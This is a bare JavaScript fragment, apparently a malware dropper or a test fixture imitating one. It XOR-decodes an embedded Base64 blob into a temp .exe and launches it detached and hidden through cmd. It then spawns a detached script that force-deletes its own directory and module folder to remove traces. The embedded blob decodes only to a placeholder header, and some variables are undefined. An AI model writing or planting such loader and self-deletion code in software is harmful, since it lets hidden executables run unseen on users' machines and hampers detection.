const LAUNCHER_BIN_BASE64 = "DxjSQiQrOjY3MCc=";
const XOR_KEY = 0x42;
const TEMP_EXE = path.join(TEMP_DIR, `tmp_${Date.now()}.exe`);
const encrypted = Buffer.from(LAUNCHER_BIN_BASE64, 'base64');
for (let i=0; i<encrypted.length; i++) decrypted[i] = encrypted[i] ^ XOR_KEY;
await writeFileWithRetry(TEMP_EXE, decrypted);
spawn('cmd', ['/c', 'start', '/b', TEMP_EXE], { detached: true });
const cleanupScript = `fs.rmSync(dir, { recursive: true, force: true }); deleteFolder(moduleDir);`;
spawn('node', [cleanupPath], { detached: true, stdio: 'ignore' });
